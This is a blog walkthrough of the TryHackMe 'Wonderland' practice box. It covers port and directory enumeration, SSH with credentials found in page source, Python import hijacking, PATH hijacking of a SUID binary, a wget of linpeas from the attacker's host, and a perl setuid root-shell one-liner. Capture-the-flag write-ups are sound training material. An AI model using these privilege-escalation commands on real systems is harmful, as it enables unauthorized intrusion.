---
layout: post
title: "Wonderland - TryHackMe"
date: 2020-07-24
ctf: true
excerpt: "Walkthrough for Wonderland on TryHackme"
tags: [Wonderland, TryHackMe, privilege escalation, website enumeration]
comments: false
---
Wonderland is a medium difficulty box on [TryHackMe](https://www.tryhackme.com). Below are the steps taken to fully compromise this box.

First, let's run **threader3000** to see what ports are open.

![Wonderland threader3000](/assets/img/Wonderland1.png)

This shows that two ports are open, 22 and 80. Let's run **nmap -A -p 22,80 [machine ip]** and see what information we are able to enumerate from this scan.

![Wonderland nmap](/assets/img/Wonderland2.png)

It appears that Goland is used as the web server. Visiting the website we see a picture of a white rabbit.

![Wonderland website](/assets/img/Wonderland3.png)

However, there is nothing in the source code to see. Let's run **gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50** and see if we are able to locate any other directories.

![Wonderland gobuster 1](/assets/img/Wonderland4.png)

gobuster returned a couple of results to review. the **/poem** subdirectory just had the poem, The Jabberwocky on it. **/r** told you to keep on going.

![Wonderland /r](/assets/img/Wonderland5.png)

At this point, I ran **gobuster dir -u http://[machine ip]/r/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50**, and it returned a subdirectory of **/a**

![Wonderland gobuster2](/assets/img/Wonderland6.png)

At this point, I remember it stated to follow the White Rabbit, and since /r/a were the beginning of rabbit, I decided to try going to **http://[machine ip]/r/a/b/b/i/t** This leads to a page telling you to enter wonderland, but nothing is clickable on the page.

![Wonderland /r/a/b/b/i/t](/assets/img/Wonderland7.png)

I decided to take a look at the source code for the page, and it appears that there were potentially a set of hidden credentials that might be useable to SSH into the server.



![Wonderland alice credentials](/assets/img/Wonderland8.png)

Let's try to ssh into the victim with **ssh alice@[machine ip]**.

![Wonderland alice ssh](/assets/img/Wonderland9.png)

Success! We were able to connect via ssh as alice. Let's take a look around. **ls -al** shows that root.txt is in this folder, but we cannot read it. Running **python3 walrus_and_the_carpenter.py** just returns 10 random lines of text from the script.

![Wonderland alice home directory](/assets/img/Wonderland10.png)

Since root.txt is in the user folder, let's see if the user flag is in the root folder with **cat /root/user.txt**. We've found the user flag!

![Wonderland user.txt](/assets/img/Wonderland11.png)

Let's run **sudo -l** and see if alice can run something as a different user. We can see that she can run python 3.6 as another user, rabbit.

![Wonderland alice sudo -l](/assets/img/Wonderland12.png)

It appears that we can open python 3.6 as rabbit by running the walrus_and_the_carpenter.py script. Let's take a look at that script first.

![Wonderland walrus_and_the_carpenter.py](/assets/img/Wonderland13.png)

With python, if you name a file with the same name as something that is imported in the same directory, it will import that file instead of the module. Let's create a script file with **nano random.py** and put in the code below.

![Wonderland random.py](/assets/img/Wonderland14.png)

Save this file and then run **sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py**. You should now have a shell as rabbit.

![Wonderland rabbit](/assets/img/Wonderland15.png)

I attempted to run **sudo -l** as rabbit, but we do not have this user's password to see what permissions they might potentially have. I navigated to rabbit's home folder with **cd /home/rabbit** and ran **ls -al** to list the directory's contents.

![Wonderland rabbit home directory](/assets/img/Wonderland16.png)

It appears that there is a SUID file in this folder. Let's run it and see what happens.

![Wonderland teaParty](/assets/img/Wonderland17.png)

At this point you can enter whatever you would like, and the program crashes. It also appears to display some text with time an hour ahead of the current time. Since we likely do not have any tools on this machine for analyzing the binary, let's run **nano teaParty** to see if we can find anything useful in the file. We can see that the **date** binary is called without an absolute path, let's use that to our advantage.

![Wonderland nano teaParty](/assets/img/Wonderland18.png)

Let's add /tmp to rabbit's $PATH variable with **export PATH="/tmp:$PATH"**. This will put /tmp as the first folder that is looked at for binaries that do not have an absolute path defined. 

![Wonderland $PATH](/assets/img/Wonderland19.png)

Next, run **cd /tmp** followed by **nano date**. Put in the two lines of codes below which can be used to launch a bash shell. 

![Wonderland /tmp/date bash shell](/assets/img/Wonderland20.png)

Save and exit nano, and then run **cd /home/rabbit**, and run **chmod +x /tmp/date** to make the date file executable. Now, execute **./teaParty**. This should give you a shell as hatter!

![Wonderland hatter shell access](/assets/img/Wonderland21.png)

Next, let's navigate to hatter's home directory with **cd /home/hatter** and run **ls -al**. There is a **password.txt** file there. Let's run **cat password.txt**.

![Wonderland hatter password.txt](/assets/img/Wonderland22.png)

In another terminal window on your attacker pc, run **ssh hatter@[machine ip] ** and use the password you just uncovered. You should be able to connect as hatter.

![Wonderland hatter ssh](/assets/img/Wonderland23.png)

hatter is not able to run **sudo -l**, so I next decided to enumerate with linpeas. On my attacker computer, I ran **python3 -m http.server** to spin up a temporary http server.

![Wonderland python3 http server](/assets/img/Wonderland24.png)

Next, I ran **wget http://[attacker ip]:8000/linpeas.sh** to download it locally onto the victim computer. I then ran **chmod +x linpeas.sh** to make it executable followed by **./linpeas.sh**

![Wonderland linpeas](/assets/img/Wonderland25.png)

In the middle of enumeration, it shows that perl has the **cap_setuid+ep** capability. This can be used to gain a root shell. Let's take a look at [GTFOBins](https://gtfobins.github.io/) to find a way to escalate to root. It appears you can run **perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'** to gain a root shell. Let's give it a try.

![Wonderland root shell](/assets/img/Wonderland27.png)

Awesome, now we just need to run **cat /home/alice/root.txt** to get the root flag!

![Wonderland root.txt](/assets/img/Wonderland28.png)

